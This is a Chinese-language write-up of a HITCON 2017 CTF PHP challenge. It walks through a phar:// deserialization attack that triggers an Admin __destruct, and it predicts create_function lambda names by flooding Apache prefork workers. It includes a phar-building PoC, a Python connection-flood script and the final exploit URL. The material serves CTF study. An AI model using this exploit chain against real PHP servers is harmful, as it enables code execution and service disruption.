# hitcon-2017-baby^h-master-php

题目直接给出源码

```php
<?php 
    $FLAG    = create_function("", 'die(`/read_flag`);'); 
    $SECRET  = `/read_secret`; 
    $SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);  
    @mkdir($SANDBOX); 
    @chdir($SANDBOX); 

    if (!isset($_COOKIE["session-data"])) { 
        $data = serialize(new User($SANDBOX)); 
        $hmac = hash_hmac("sha1", $data, $SECRET); 
        setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); 
    } 

    class User { 
        public $avatar; 
        function __construct($path) { 
            $this->avatar = $path; 
        } 
    } 

    class Admin extends User { 
        function __destruct(){ 
            $random = bin2hex(openssl_random_pseudo_bytes(32)); 
            eval("function my_function_$random() {" 
                ."  global \$FLAG; \$FLAG();" 
                ."}"); 
            $_GET["lucky"](); 
        } 
    } 

    function check_session() { 
        global $SECRET; 
        $data = $_COOKIE["session-data"]; 
        list($data, $hmac) = explode("-----", $data, 2); 
        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) 
            die("Bye"); 
        if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) ) 
            die("Bye Bye"); 

        $data = unserialize($data); 
        if ( !isset($data->avatar) ) 
            die("Bye Bye Bye"); 
        return $data->avatar; 
    } 

    function upload($path) { 
        $data = file_get_contents($_GET["url"] . "/avatar.gif"); 
        if (substr($data, 0, 6) !== "GIF89a") 
            die("Fuck off"); 
        file_put_contents($path . "/avatar.gif", $data); 
        die("Upload OK"); 
    } 

    function show($path) { 
        if ( !file_exists($path . "/avatar.gif") ) 
            $path = "/var/www/html"; 
        header("Content-Type: image/gif"); 
        die(file_get_contents($path . "/avatar.gif")); 
    } 

    $mode = $_GET["m"]; 
    if ($mode == "upload") 
        upload(check_session()); 
    else if ($mode == "show") 
        show(check_session()); 
    else 
        highlight_file(__FILE__); 
```

可以看出 flag 在 `Admin` 类中，如果能构造反序列化触发 `__destruct` 函数就能获取 flag

## phar 反序列化

简单的说，当使用 phar:// 协议读取 phar 文件的时候，文件内容会被解析成 phar 对象，然后 phar 对象内的 Metadata 信息会被反序列化。

在 `upload` 函数中调用了 `file_get_content()` 函数,可以利用 `phar://` 协议读取本地 `phar` 文件(phar协议不支持远程文件)

因此只需在 VPS 生成一个 phar 文件, `metadata` 设置为 Admin 对象，就能调用 `__destruct` 函数，然后利用 upload 访问 `?m=upload&url=http://ip` 写到服务器

p牛的 PoC：
```php
<?php
class Admin {
    public $avatar = 'orz';  
}
$p = new Phar(__DIR__ . '/avatar.phar', 0);
$p['file.php'] = '<?php ?>';
$p->setMetadata(new Admin());
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');
?>
```

## creat_function
在 payload 下载后，我们便需要访问它，但是获取 flag 的方式有两种
一是使用 `my_function_$random` 函数，但是 `$random` 是随机数，不可能猜出来；二便是直接调用 `$FLAG` 函数

```php
$FLAG = create_function("", 'die(`/read_flag`);');
```

但 `$FLAG` 函数是通过 `create_function` 创建，并没有设置函数名字，但其实这里声明的函数是有函数名的，匿名函数会被设置为`\x00lambda_%d`，`%d` 是从 1 递增的，直到最大长度结束。


但是我们并不知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数。

## Apache-prefork

来自 Pr0phet 师傅的 wp:
> Apache-prefork 模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256 个 child server, 这时候如果用户大量请求, Apache就会在处理完 MaxRequestsPerChild 个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法fork出新进程了) 在这个新进程里面匿名函数就会是从1开始的了

这里我们可以通过大量的请求来迫使 Pre-fork 模式启动的 Apache 启动新的线程，这样 `%d` 会刷新为1，就可以预测了。


运行 Orange 师傅给的 PoC

```Python
import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

def run(i):
    while 1:
        HOST = '127.0.0.1'
        PORT = 8007
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall('GET / HTTP/1.1\nHost: 127.0.0.1:8007\nConnection: Keep-Alive\n\n')
        # s.close()
        print 'ok'
        time.sleep(0.5)

i = 8
pool = ThreadPool( i )
result = pool.map_async( run, range(i) ).get(0xffff)
```

同时尝试访问 `?m=upload&url=phar:///var/www/data/xxx&lucky=%00lambda_1`（xxx为 orange+ip 的 md5） 拿到 Flag

## References
[hitconDockerfile/hitcon-ctf-2017/baby^h-master-php-2017](https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)
[HITCON2017-writeup整理](https://lorexxar.cn/2017/11/10/hitcon2017-writeup/)

